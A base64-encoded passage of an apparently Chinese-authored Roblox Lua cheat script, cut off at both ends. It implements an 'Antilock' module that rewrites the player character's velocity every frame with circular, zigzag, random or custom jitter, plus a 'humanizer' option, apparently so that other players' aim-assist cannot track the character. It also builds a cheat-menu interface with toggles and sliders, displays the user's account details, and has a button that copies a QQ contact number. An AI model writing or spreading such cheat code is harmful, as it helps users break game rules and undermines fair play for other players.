iHquWumuS5ieaooeW8jwogICAgQ3VzdG9tID0gewogICAgICAgIFhNdWx0aXBsaWVyID0gMS4wLAogICAgICAgIFlNdWx0aXBsaWVyID0gMS4wLAogICAgICAgIFpNdWx0aXBsaWVyID0gMS4wLAogICAgICAgIEN1c3RvbVBhdHRlcm4gPSBmdW5jdGlvbihkZWx0YVRpbWUpCiAgICAgICAgICAgIHJldHVybiBWZWN0b3IzLm5ldygKICAgICAgICAgICAgICAgIG1hdGguc2luKGRlbHRhVGltZSAqIDEwKSAqIDIsCiAgICAgICAgICAgICAgICBtYXRoLmNvcyhkZWx0YVRpbWUgKiA4KSAqIDEuNSwKICAgICAgICAgICAgICAgIG1hdGguc2luKGRlbHRhVGltZSAqIDEyKSAqIDEuOAogICAgICAgICAgICApCiAgICAgICAgZW5kCiAgICB9Cn0KCi0tIOWFqOWxgOWPmOmHjwpsb2NhbCBBbnRpbG9ja0Nvbm5lY3Rpb24gPSBuaWwKbG9jYWwgTGFzdFBvc2l0aW9uID0gbmlsCmxvY2FsIE1vdmVtZW50SGlzdG9yeSA9IHt9CmxvY2FsIE1heEhpc3RvcnkgPSAxMAoKLS0g6I635Y+W6KeS6Imy5qC56YOo5L2NCmxvY2FsIGZ1bmN0aW9uIEdldENoYXJhY3RlclJvb3QoKQogICAgbG9jYWwgY2hhcmFjdGVyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICBpZiBub3QgY2hhcmFjdGVyIHRoZW4gcmV0dXJuIG5pbCBlbmQKICAgIAogICAgcmV0dXJuIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIG9yIAogICAgICAgICAgIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiVG9yc28iKSBvciAKICAgICAgICAgICBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlVwcGVyVG9yc28iKQplbmQKCi0tIOiuoeeul+enu+WKqOaWueWQkQpsb2NhbCBmdW5jdGlvbiBDYWxjdWxhdGVNb3ZlbWVudERpcmVjdGlvbigpCiAgICBsb2NhbCBtb3ZlRGlyZWN0aW9uID0gVmVjdG9yMy5uZXcoMCwgMCwgMCkKICAgIAogICAgLS0g6ZSu55uY6L6T5YWlCiAgICBpZiBVc2VySW5wdXRTZXJ2aWNlOklzS2V5RG93bihFbnVtLktleUNvZGUuVykgdGhlbgogICAgICAgIG1vdmVEaXJlY3Rpb24gPSBtb3ZlRGlyZWN0aW9uICsgVmVjdG9yMy5uZXcoMCwgMCwgLTEpCiAgICBlbmQKICAgIGlmIFVzZXJJbnB1dFNlcnZpY2U6SXNLZXlEb3duKEVudW0uS2V5Q29kZS5TKSB0aGVuCiAgICAgICAgbW92ZURpcmVjdGlvbiA9IG1vdmVEaXJlY3Rpb24gKyBWZWN0b3IzLm5ldygwLCAwLCAxKQogICAgZW5kCiAgICBpZiBVc2VySW5wdXRTZXJ2aWNlOklzS2V5RG93bihFbnVtLktleUNvZGUuQSkgdGhlbgogICAgICAgIG1vdmVEaXJlY3Rpb24gPSBtb3ZlRGlyZWN0aW9uICsgVmVjdG9yMy5uZXcoLTEsIDAsIDApCiAgICBlbmQKICAgIGlmIFVzZXJJbnB1dFNlcnZpY2U6SXNLZXlEb3duKEVudW0uS2V5Q29kZS5EKSB0aGVuCiAgICAgICAgbW92ZURpcmVjdGlvbiA9IG1vdmVEaXJlY3Rpb24gKyBWZWN0b3IzLm5ldygxLCAwLCAwKQogICAgZW5kCiAgICAKICAgIC0tIOagh+WHhuWMluaWueWQkQogICAgaWYgbW92ZURpcmVjdGlvbi5NYWduaXR1ZGUgPiAwIHRoZW4KICAgICAgICBtb3ZlRGlyZWN0aW9uID0gbW92ZURpcmVjdGlvbi5Vbml0CiAgICBlbmQKICAgIAogICAgcmV0dXJuIG1vdmVEaXJlY3Rpb24KZW5kCgotLSDojrflj5bpooTmtYvkvY3nva4KbG9jYWwgZnVuY3Rpb24gR2V0UHJlZGljdGVkUG9zaXRpb24oKQogICAgbG9jYWwgcm9vdCA9IEdldENoYXJhY3RlclJvb3QoKQogICAgaWYgbm90IHJvb3QgdGhlbiByZXR1cm4gbmlsIGVuZAogICAgCiAgICBsb2NhbCB2ZWxvY2l0eSA9IHJvb3QuVmVsb2NpdHkKICAgIHJldHVybiByb290LlBvc2l0aW9uICsgKHZlbG9jaXR5ICogQW50aWxvY2suUHJlZGljdGlvbikKZW5kCgotLSDnlJ/miJDlj43plIHlrprmqKHlvI8KbG9jYWwgZnVuY3Rpb24gR2VuZXJhdGVBbnRpbG9ja1BhdHRlcm4oZGVsdGFUaW1lLCBiYXNlUG9zaXRpb24pCiAgICBpZiBBbnRpbG9jay5Nb2RlID09ICJEZWZhdWx0IiB0aGVuCiAgICAgICAgLS0g6buY6K6k5ZyG5b2i5qih5byPCiAgICAgICAgbG9jYWwgdGltZSA9IHRpY2soKSAqIEFudGlsb2NrLlNwZWVkCiAgICAgICAgcmV0dXJuIFZlY3RvcjMubmV3KAogICAgICAgICAgICBtYXRoLnNpbih0aW1lKSAqIEFudGlsb2NrLlN0cmVuZ3RoLAogICAgICAgICAgICBtYXRoLmNvcyh0aW1lICogMC44KSAqIEFudGlsb2NrLlN0cmVuZ3RoICogMC41LAogICAgICAgICAgICBtYXRoLmNvcyh0aW1lKSAqIEFudGlsb2NrLlN0cmVuZ3RoCiAgICAgICAgKQogICAgICAgIAogICAgZWxzZWlmIEFudGlsb2NrLk1vZGUgPT0gIkFkdmFuY2VkIiB0aGVuCiAgICAgICAgLS0g6auY57qn5qih5byPCiAgICAgICAgbG9jYWwgdGltZSA9IHRpY2soKSAqIEFudGlsb2NrLlNwZWVkCiAgICAgICAgbG9jYWwgcGF0dGVybiA9IFZlY3RvcjMubmV3KDAsIDAsIDApCiAgICAgICAgCiAgICAgICAgaWYgQW50aWxvY2suQWR2YW5jZWQuUGF0dGVybiA9PSAiQ2lyY3VsYXIiIHRoZW4KICAgICAgICAgICAgcGF0dGVybiA9IFZlY3RvcjMubmV3KAogICAgICAgICAgICAgICAgbWF0aC5zaW4odGltZSkgKiBBbnRpbG9jay5TdHJlbmd0aCwKICAgICAgICAgICAgICAgIG1hdGguY29zKHRpbWUgKiAwLjgpICogQW50aWxvY2suU3RyZW5ndGggKiAwLjYsCiAgICAgICAgICAgICAgICBtYXRoLmNvcyh0aW1lKSAqIEFudGlsb2NrLlN0cmVuZ3RoCiAgICAgICAgICAgICkKICAgICAgICBlbHNlaWYgQW50aWxvY2suQWR2YW5jZWQuUGF0dGVybiA9PSAiWmlnemFnIiB0aGVuCiAgICAgICAgICAgIHBhdHRlcm4gPSBWZWN0b3IzLm5ldygKICAgICAgICAgICAgICAgIG1hdGguYWJzKG1hdGguc2luKHRpbWUgKiAyKSkgKiBBbnRpbG9jay5TdHJlbmd0aCAqIDIgLSBBbnRpbG9jay5TdHJlbmd0aCwKICAgICAgICAgICAgICAgIG1hdGguc2luKHRpbWUgKiAxLjUpICogQW50aWxvY2suU3RyZW5ndGggKiAwLjMsCiAgICAgICAgICAgICAgICBtYXRoLmFicyhtYXRoLmNvcyh0aW1lICogMikpICogQW50aWxvY2suU3RyZW5ndGggKiAyIC0gQW50aWxvY2suU3RyZW5ndGgKICAgICAgICAgICAgKQogICAgICAgIGVsc2VpZiBBbnRpbG9jay5BZHZhbmNlZC5QYXR0ZXJuID09ICJSYW5kb20iIHRoZW4KICAgICAgICAgICAgbG9jYWwgc2VlZCA9IG1hdGguZmxvb3IodGltZSAqIDEwKQogICAgICAgICAgICBtYXRoLnJhbmRvbXNlZWQoc2VlZCkKICAgICAgICAgICAgcGF0dGVybiA9IFZlY3RvcjMubmV3KAogICAgICAgICAgICAgICAgKG1hdGgucmFuZG9tKCkgKiAyIC0gMSkgKiBBbnRpbG9jay5TdHJlbmd0aCwKICAgICAgICAgICAgICAgIChtYXRoLnJhbmRvbSgpICogMiAtIDEpICogQW50aWxvY2suU3RyZW5ndGggKiAwLjMsCiAgICAgICAgICAgICAgICAobWF0aC5yYW5kb20oKSAqIDIgLSAxKSAqIEFudGlsb2NrLlN0cmVuZ3RoCiAgICAgICAgICAgICkKICAgICAgICBlbHNlaWYgQW50aWxvY2suQWR2YW5jZWQuUGF0dGVybiA9PSAiTGluZWFyIiB0aGVuCiAgICAgICAgICAgIHBhdHRlcm4gPSBWZWN0b3IzLm5ldygKICAgICAgICAgICAgICAgIG1hdGguc2luKHRpbWUpICogQW50aWxvY2suU3RyZW5ndGgsCiAgICAgICAgICAgICAgICAwLAogICAgICAgICAgICAgICAgbWF0aC5jb3ModGltZSkgKiBBbnRpbG9jay5TdHJlbmd0aAogICAgICAgICAgICApCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgLS0g5re75Yqg5oqW5YqoCiAgICAgICAgaWYgQW50aWxvY2suSHVtYW5pemVyIHRoZW4KICAgICAgICAgICAgcGF0dGVybiA9IHBhdHRlcm4gKyBWZWN0b3IzLm5ldygKICAgICAgICAgICAgICAgIChtYXRoLnJhbmRvbSgpICogMiAtIDEpICogQW50aWxvY2suQWR2YW5jZWQuSml0dGVyLAogICAgICAgICAgICAgICAgKG1hdGgucmFuZG9tKCkgKiAyIC0gMSkgKiBBbnRpbG9jay5BZHZhbmNlZC5KaXR0ZXIgKiAwLjIsCiAgICAgICAgICAgICAgICAobWF0aC5yYW5kb20oKSAqIDIgLSAxKSAqIEFudGlsb2NrLkFkdmFuY2VkLkppdHRlcgogICAgICAgICAgICApCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgcmV0dXJuIHBhdHRlcm4KICAgICAgICAKICAgIGVsc2VpZiBBbnRpbG9jay5Nb2RlID09ICJDdXN0b20iIHRoZW4KICAgICAgICAtLSDoh6rlrprkuYnmqKHlvI8KICAgICAgICBsb2NhbCBjdXN0b21QYXR0ZXJuID0gQW50aWxvY2suQ3VzdG9tLkN1c3RvbVBhdHRlcm4oZGVsdGFUaW1lKQogICAgICAgIHJldHVybiBWZWN0b3IzLm5ldygKICAgICAgICAgICAgY3VzdG9tUGF0dGVybi5YICogQW50aWxvY2suQ3VzdG9tLlhNdWx0aXBsaWVyLAogICAgICAgICAgICBjdXN0b21QYXR0ZXJuLlkgKiBBbnRpbG9jay5DdXN0b20uWU11bHRpcGxpZXIsCiAgICAgICAgICAgIGN1c3RvbVBhdHRlcm4uWiAqIEFudGlsb2NrLkN1c3RvbS5aTXVsdGlwbGllcgogICAgICAgICkKICAgIGVuZAogICAgCiAgICByZXR1cm4gVmVjdG9yMy5uZXcoMCwgMCwgMCkKZW5kCgotLSDlupTnlKjlj43plIHlrpoKbG9jYWwgZnVuY3Rpb24gQXBwbHlBbnRpbG9jaygpCiAgICBsb2NhbCBjaGFyYWN0ZXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIGlmIG5vdCBjaGFyYWN0ZXIgdGhlbiByZXR1cm4gZW5kCiAgICAKICAgIGxvY2FsIGh1bWFub2lkID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgbG9jYWwgcm9vdCA9IEdldENoYXJhY3RlclJvb3QoKQogICAgaWYgbm90IGh1bWFub2lkIG9yIG5vdCByb290IHRoZW4gcmV0dXJuIGVuZAogICAgCiAgICAtLSDojrflj5blvZPliY3ml7bpl7QKICAgIGxvY2FsIGN1cnJlbnRUaW1lID0gdGljaygpCiAgICAKICAgIC0tIOiuoeeul+enu+WKqOaWueWQkQogICAgbG9jYWwgbW92ZURpcmVjdGlvbiA9IENhbGN1bGF0ZU1vdmVtZW50RGlyZWN0aW9uKCkKICAgIAogICAgLS0g6I635Y+W6aKE5rWL5L2N572uCiAgICBsb2NhbCBwcmVkaWN0ZWRQb3NpdGlvbiA9IEdldFByZWRpY3RlZFBvc2l0aW9uKCkKICAgIGlmIG5vdCBwcmVkaWN0ZWRQb3NpdGlvbiB0aGVuIHJldHVybiBlbmQKICAgIAogICAgLS0g55Sf5oiQ5Y+N6ZSB5a6a5qih5byPCiAgICBsb2NhbCBhbnRpbG9ja09mZnNldCA9IEdlbmVyYXRlQW50aWxvY2tQYXR0ZXJuKGN1cnJlbnRUaW1lLCBwcmVkaWN0ZWRQb3NpdGlvbikKICAgIAogICAgLS0g5bqU55So56e75YqoCiAgICBpZiBtb3ZlRGlyZWN0aW9uLk1hZ25pdHVkZSA+IDAgdGhlbgogICAgICAgIC0tIOeOqeWutuWcqOenu+WKqOaXtu+8jOWwhuWPjemUgeWumuaooeW8j+S4juenu+WKqOaWueWQkee7k+WQiAogICAgICAgIGxvY2FsIGNhbWVyYSA9IHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhCiAgICAgICAgbG9jYWwgY2FtZXJhQ0ZyYW1lID0gY2FtZXJhLkNGcmFtZQogICAgICAgIAogICAgICAgIC0tIOWwhuenu+WKqOaWueWQkei9rOaNouWIsOebuOacuuepuumXtAogICAgICAgIGxvY2FsIGNhbWVyYUxvb2tWZWN0b3IgPSBjYW1lcmFDRnJhbWUuTG9va1ZlY3RvcgogICAgICAgIGxvY2FsIGNhbWVyYVJpZ2h0VmVjdG9yID0gY2FtZXJhQ0ZyYW1lLlJpZ2h0VmVjdG9yCiAgICAgICAgCiAgICAgICAgbG9jYWwgd29ybGRNb3ZlRGlyZWN0aW9uID0gKGNhbWVyYUxvb2tWZWN0b3IgKiBtb3ZlRGlyZWN0aW9uLlopICsgKGNhbWVyYVJpZ2h0VmVjdG9yICogbW92ZURpcmVjdGlvbi5YKQogICAgICAgIHdvcmxkTW92ZURpcmVjdGlvbiA9IHdvcmxkTW92ZURpcmVjdGlvbi5Vbml0CiAgICAgICAgCiAgICAgICAgLS0g57uT5ZCI5Y+N6ZSB5a6a5YGP56e7CiAgICAgICAgbG9jYWwgZmluYWxNb3ZlRGlyZWN0aW9uID0gd29ybGRNb3ZlRGlyZWN0aW9uICsgYW50aWxvY2tPZmZzZXQuVW5pdCAqIDAuMwogICAgICAgIAogICAgICAgIC0tIOW6lOeUqOenu+WKqAogICAgICAgIHJvb3QuVmVsb2NpdHkgPSBmaW5hbE1vdmVEaXJlY3Rpb24gKiBodW1hbm9pZC5XYWxrU3BlZWQgKiBBbnRpbG9jay5TdHJlbmd0aAogICAgZWxzZQogICAgICAgIC0tIOeOqeWutumdmeatouaXtu+8jOWPquW6lOeUqOWPjemUgeWumuaooeW8jwogICAgICAgIHJvb3QuVmVsb2NpdHkgPSBhbnRpbG9ja09mZnNldCAqIEFudGlsb2NrLlN0cmVuZ3RoCiAgICBlbmQKICAgIAogICAgLS0g5pu05paw5Y6G5Y+y6K6w5b2VCiAgICB0YWJsZS5pbnNlcnQoTW92ZW1lbnRIaXN0b3J5LCB7CiAgICAgICAgVGltZSA9IGN1cnJlbnRUaW1lLAogICAgICAgIFBvc2l0aW9uID0gcm9vdC5Qb3NpdGlvbiwKICAgICAgICBWZWxvY2l0eSA9IHJvb3QuVmVsb2NpdHkKICAgIH0pCiAgICAKICAgIC0tIOmZkOWItuWOhuWPsuiusOW9leWkp+WwjwogICAgaWYgI01vdmVtZW50SGlzdG9yeSA+IE1heEhpc3RvcnkgdGhlbgogICAgICAgIHRhYmxlLnJlbW92ZShNb3ZlbWVudEhpc3RvcnksIDEpCiAgICBlbmQKICAgIAogICAgTGFzdFBvc2l0aW9uID0gcm9vdC5Qb3NpdGlvbgplbmQKCi0tIOW8gOWni+WPjemUgeWumgpsb2NhbCBmdW5jdGlvbiBTdGFydEFudGlsb2NrKCkKICAgIGlmIEFudGlsb2NrQ29ubmVjdGlvbiB0aGVuIHJldHVybiBlbmQKICAgIAogICAgQW50aWxvY2tDb25uZWN0aW9uID0gUnVuU2VydmljZS5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbihkZWx0YVRpbWUpCiAgICAgICAgaWYgbm90IEFudGlsb2NrLkVuYWJsZWQgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgaWYgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlciB0aGVuIHJldHVybiBlbmQKICAgICAgICAKICAgICAgICBsb2NhbCBzdWNjZXNzLCBlcnIgPSBwY2FsbChBcHBseUFudGlsb2NrKQogICAgICAgIGlmIG5vdCBzdWNjZXNzIHRoZW4KICAgICAgICAgICAgd2FybigiQW50aWxvY2vplJnor686ICIgLi4gdG9zdHJpbmcoZXJyKSkKICAgICAgICBlbmQKICAgIGVuZCkKZW5kCgotLSDlgZzmraLlj43plIHlrpoKbG9jYWwgZnVuY3Rpb24gU3RvcEFudGlsb2NrKCkKICAgIGlmIEFudGlsb2NrQ29ubmVjdGlvbiB0aGVuCiAgICAgICAgQW50aWxvY2tDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQogICAgICAgIEFudGlsb2NrQ29ubmVjdGlvbiA9IG5pbAogICAgZW5kCiAgICAKICAgIC0tIOmHjee9ruinkuiJsumAn+W6pgogICAgbG9jYWwgY2hhcmFjdGVyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICBpZiBjaGFyYWN0ZXIgdGhlbgogICAgICAgIGxvY2FsIHJvb3QgPSBHZXRDaGFyYWN0ZXJSb290KCkKICAgICAgICBpZiByb290IHRoZW4KICAgICAgICAgICAgcm9vdC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsIHJvb3QuVmVsb2NpdHkuWSwgMCkKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICBNb3ZlbWVudEhpc3RvcnkgPSB7fQogICAgTGFzdFBvc2l0aW9uID0gbmlsCmVuZAoKLS0g5YiH5o2i5Y+N6ZSB5a6aCmxvY2FsIGZ1bmN0aW9uIFRvZ2dsZUFudGlsb2NrKCkKICAgIGlmIEFudGlsb2NrLkVuYWJsZWQgdGhlbgogICAgICAgIFN0YXJ0QW50aWxvY2soKQogICAgZWxzZQogICAgICAgIFN0b3BBbnRpbG9jaygpCiAgICBlbmQKZW5kCgotLSDlr7zlh7rlh73mlbAKbG9jYWwgQW50aWxvY2tNb2R1bGUgPSB7CiAgICAtLSDphY3nva4KICAgIENvbmZpZyA9IEFudGlsb2NrLAogICAgCiAgICAtLSDmjqfliLblh73mlbAKICAgIEVuYWJsZSA9IGZ1bmN0aW9uKCkKICAgICAgICBBbnRpbG9jay5FbmFibGVkID0gdHJ1ZQogICAgICAgIFRvZ2dsZUFudGlsb2NrKCkKICAgIGVuZCwKICAgIAogICAgRGlzYWJsZSA9IGZ1bmN0aW9uKCkKICAgICAgICBBbnRpbG9jay5FbmFibGVkID0gZmFsc2UKICAgICAgICBUb2dnbGVBbnRpbG9jaygpCiAgICBlbmQsCiAgICAKICAgIFRvZ2dsZSA9IGZ1bmN0aW9uKCkKICAgICAgICBBbnRpbG9jay5FbmFibGVkID0gbm90IEFudGlsb2NrLkVuYWJsZWQKICAgICAgICBUb2dnbGVBbnRpbG9jaygpCiAgICBlbmQsCiAgICAKICAgIC0tIOiuvue9ruWHveaVsAogICAgU2V0TW9kZSA9IGZ1bmN0aW9uKG1vZGUpCiAgICAgICAgaWYgbW9kZSA9PSAiRGVmYXVsdCIgb3IgbW9kZSA9PSAiQWR2YW5jZWQiIG9yIG1vZGUgPT0gIkN1c3RvbSIgdGhlbgogICAgICAgICAgICBBbnRpbG9jay5Nb2RlID0gbW9kZQogICAgICAgIGVuZAogICAgZW5kLAogICAgCiAgICBTZXRTdHJlbmd0aCA9IGZ1bmN0aW9uKHN0cmVuZ3RoKQogICAgICAgIEFudGlsb2NrLlN0cmVuZ3RoID0gbWF0aC5jbGFtcChzdHJlbmd0aCwgMC4xLCA1LjApCiAgICBlbmQsCiAgICAKICAgIFNldFNwZWVkID0gZnVuY3Rpb24oc3BlZWQpCiAgICAgICAgQW50aWxvY2suU3BlZWQgPSBtYXRoLmNsYW1wKHNwZWVkLCAwLjEsIDUuMCkKICAgIGVuZCwKICAgIAogICAgLS0g54q25oCB6I635Y+WCiAgICBJc0VuYWJsZWQgPSBmdW5jdGlvbigpCiAgICAgICAgcmV0dXJuIEFudGlsb2NrLkVuYWJsZWQKICAgIGVuZCwKICAgIAogICAgR2V0U3RhdHVzID0gZnVuY3Rpb24oKQogICAgICAgIHJldHVybiB7CiAgICAgICAgICAgIEVuYWJsZWQgPSBBbnRpbG9jay5FbmFibGVkLAogICAgICAgICAgICBNb2RlID0gQW50aWxvY2suTW9kZSwKICAgICAgICAgICAgU3RyZW5ndGggPSBBbnRpbG9jay5TdHJlbmd0aCwKICAgICAgICAgICAgU3BlZWQgPSBBbnRpbG9jay5TcGVlZAogICAgICAgIH0KICAgIGVuZCwKICAgIAogICAgLS0g5riF55CG5Ye95pWwCiAgICBEZXN0cm95ID0gZnVuY3Rpb24oKQogICAgICAgIFN0b3BBbnRpbG9jaygpCiAgICBlbmQKfQoKLS0gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KLS0g5Li756qX5Y+j5YaF5a655Yib5bu6Ci0tID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CmxvY2FsIGZ1bmN0aW9uIENyZWF0ZU1haW5XaW5kb3dDb250ZW50KCkKICAgIC0tIOWFrOWRiiBUYWIKICAgIGxvY2FsIFRhYjEgPSBXaW5kb3c6Q3JlYXRlVGFiKCLlhazlkYoiLCA3NzMzNzc5NjEwKQogICAgCiAgICBsb2NhbCBmdW5jdGlvbiBnZXREYXRlKCkgcmV0dXJuIG9zLmRhdGUoIiVZLSVtLSVkICVIOiVNIikgZW5kCiAgICBsb2NhbCBmdW5jdGlvbiBnZXRQbGF5ZXIoKQogICAgICAgIGxvY2FsIHAgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICByZXR1cm4gewogICAgICAgICAgICBbIueUqOaIt+WQjSJdICAgPSBwLk5hbWUsCiAgICAgICAgICAgIFsi5pi+56S65ZCNIl0gICA9IHAuRGlzcGxheU5hbWUsCiAgICAgICAgICAgIFsi55So5oi3SUQiXSAgID0gcC5Vc2VySWQsCiAgICAgICAgICAgIFsi5rOo5YaM5aSp5pWwIl0gPSBwLkFjY291bnRBZ2UsCiAgICAgICAgICAgIFsi5b2T5YmN5ri45oiPIl0gPSBnYW1lOkdldFNlcnZpY2UoIk1hcmtldHBsYWNlU2VydmljZSIpOkdldFByb2R1Y3RJbmZvKGdhbWUuUGxhY2VJZCkuTmFtZQogICAgICAgIH0KICAgIGVuZAogICAgCiAgICBUYWIxOkNyZWF0ZVNlY3Rpb24oIuezu+e7n+S/oeaBryIpCiAgICBUYWIxOkNyZWF0ZUxhYmVsKCLwn5OFIOW9k+WJjeaXtumXtDogIiAuLiBnZXREYXRlKCkpCiAgICAKICAgIGZvciBrLCB2IGluIHBhaXJzKGdldFBsYXllcigpKSBkbwogICAgICAgIFRhYjE6Q3JlYXRlTGFiZWwoayAuLiAi77yaICIgLi4gdG9zdHJpbmcodikpCiAgICBlbmQKICAgIAogICAgVGFiMTpDcmVhdGVCdXR0b24oewogICAgICAgIE5hbWUgPSAi5LiA6ZSu5aSN5Yi2UVHlj7ciLCAKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkgCiAgICAgICAgICAgIGxvY2FsIHN1Y2Nlc3MgPSBDb3B5VG9DbGlwYm9hcmQoIjkxMzM0ODI4NSIpCiAgICAgICAgICAgIFNob3dDb3B5Tm90aWZpY2F0aW9uKHN1Y2Nlc3MsICI5MTMzNDgyODUiKQogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgLS0g5Lq654mp5Yqf6IO9IFRhYgogICAgbG9jYWwgVGFiMiA9IFdpbmRvdzpDcmVhdGVUYWIoIuS6uueJqeWKn+iDvSIsIDc3MzM3Nzk2MTApCiAgICAKICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiAgICAtLSBBbnRpbG9jayDlj43plIHlrprns7vnu58KICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiAgICBUYWIyOkNyZWF0ZVNlY3Rpb24oIkFudGlsb2NrIOWPjemUgeWumuezu+e7nyIpCiAgICAKICAgIFRhYjI6Q3JlYXRlVG9nZ2xlKHsKICAgICAgICBOYW1lID0gIuWQr+eUqCBBbnRpbG9jayIsCiAgICAgICAgQ3VycmVudFZhbHVlID0gQW50aWxvY2suRW5hYmxlZCwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHZhbHVlKQogICAgICAgICAgICBpZiB2YWx1ZSB0aGVuCiAgICAgICAgICAgICAgICBBbnRpbG9ja01vZHVsZS5FbmFibGUoKQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBBbnRpbG9ja01vZHVsZS5EaXNhYmxlKCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICB9KQogICAgCiAgICBUYWIyOkNyZWF0ZURyb3Bkb3duKHsKICAgICAgICBOYW1lID0gIkFudGlsb2NrIOaooeW8jyIsCiAgICAgICAgT3B0aW9ucyA9IHsiRGVmYXVsdCIsICJBZHZhbmNlZCIsICJDdXN0b20ifSwKICAgICAgICBDdXJyZW50T3B0aW9uID0gQW50aWxvY2suTW9kZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHZhbHVlKQogICAgICAgICAgICBBbnRpbG9ja01vZHVsZS5TZXRNb2RlKHZhbHVlKQogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgVGFiMjpDcmVhdGVTbGlkZXIoewogICAgICAgIE5hbWUgPSAiQW50aWxvY2sg5by65bqmIiwKICAgICAgICBSYW5nZSA9IHswLjEsIDUuMH0sCiAgICAgICAgSW5jcmVtZW50ID0gMC4xLAogICAgICAgIFN1ZmZpeCA9ICLlgI0iLAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IEFudGlsb2NrLlN0cmVuZ3RoLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgICAgIEFudGlsb2NrTW9kdWxlLlNldFN0cmVuZ3RoKHZhbHVlKQogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgVGFiMjpDcmVhdGVTbGlkZXIoewogICAgICAgIE5hbWUgPSAiQW50aWxvY2sg6YCf5bqmIiwKICAgICAgICBSYW5nZSA9IHswLjEsIDUuMH0sCiAgICAgICAgSW5jcmVtZW50ID0gMC4xLAogICAgICAgIFN1ZmZpeCA9ICLlgI0iLAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IEFudGlsb2NrLlNwZWVkLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgICAgIEFudGlsb2NrTW9kdWxlLlNldFNwZWVkKHZhbHVlKQogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgVGFiMjpDcmVhdGVTbGlkZXIoewogICAgICAgIE5hbWUgPSAi6aKE5rWL5pe26Ze0IiwKICAgICAgICBSYW5nZSA9IHswLjAsIDEuMH0sCiAgICAgICAgSW5jcmVtZW50ID0gMC4wMSwKICAgICAgICBTdWZmaXggPSAi56eSIiwKICAgICAgICBDdXJyZW50VmFsdWUgPSBBbnRpbG9jay5QcmVkaWN0aW9uLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgICAgIEFudGlsb2NrLlByZWRpY3Rpb24gPSB2YWx1ZQogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgVGFiMjpDcmVhdGVUb2dnbGUoewogICAgICAgIE5hbWUgPSAi5Lq65oCn5YyW5qih5byPIiwKICAgICAgICBDdXJyZW50VmFsdWUgPSBBbnRpbG9jay5IdW1hbml6ZXIsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICAgICAgQW50aWxvY2suSHVtYW5pemVyID0gdmFsdWUKICAgICAgICBlbmQKICAgIH0pCiAgICAKICAgIC0tIOmrmOe6p+iuvue9rgogICAgbG9jYWwgQWR2YW5jZWRTZWN0aW9uID0gVGFiMjpDcmVhdGVTZWN0aW9uKCLpq5jnuqforr7nva4iKQogICAgCiAgICBUYWIyOkNyZWF0ZVNsaWRlcih7CiAgICAgICAgTmFtZSA9ICLmipbliqjlvLrluqYiLAogICAgICAgIFJhbmdlID0gezAuMCwgMC41fSwKICAgICAgICBJbmNyZW1lbnQgPSAwLjAxLAogICAgICAgIFN1ZmZpeCA9ICIiLAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IEFudGlsb2NrLkFkdmFuY2VkLkppdHRlciwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHZhbHVlKQogICAgICAgICAgICBBbnRpbG9jay5BZHZhbmNlZC5KaXR0ZXIgPSB2YWx1ZQogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgVGFiMjpDcmVhdGVTbGlkZXIoewogICAgICAgIE5hbWUgPSAi6ZqP5py65YyW56iL5bqmIiwKICAgICAgICBSYW5nZSA9IHswLjAsIDAuNX0sCiAgICAgICAgSW5jcmVtZW50ID0gMC4wMSwKICAgICAgICBTdWZmaXggPSAiIiwKICAgICAgICBDdXJyZW50VmFsdWUgPSBBbnRpbG9jay5BZHZhbmNlZC5SYW5kb21pemF0aW9uLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgICAgIEFudGlsb2NrLkFkdmFuY2V